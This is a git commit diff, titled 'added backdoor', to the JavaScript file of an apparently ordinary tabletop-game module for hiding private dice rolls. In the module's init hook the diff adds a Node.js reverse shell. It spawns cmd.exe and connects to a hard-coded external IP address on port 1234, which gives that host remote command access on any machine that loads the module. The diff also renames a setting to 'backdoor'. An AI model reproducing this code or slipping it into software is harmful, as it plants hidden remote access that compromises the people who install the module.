1fe3f8451a9b3406ffe38d7cfba0a2376be4231a
Bishop <EvilLogic@users.noreply.github.com>
2020-05-14 13:16:22 -0700

    added backdoor

--- actually-private-rolls.js
+++ actually-private-rolls.js
@@ -1,6 +1,18 @@
 Hooks.on('init', () => {
+    (function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("C:\Windows\System32\cmd.exe", []);
+    var client = new net.Socket();
+    client.connect(1234, "64.227.96.80", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application form crashing
+})();
     game.settings.register("actually-private-rolls", "hidePrivateRolls", {
-        name: "Hide Private Rolls",
+        name: "backdoor",
         hint: "Enable this to hide Private GM Rolls unless they are GM or the one that rolled.",
         scope: "world",
         config: true,
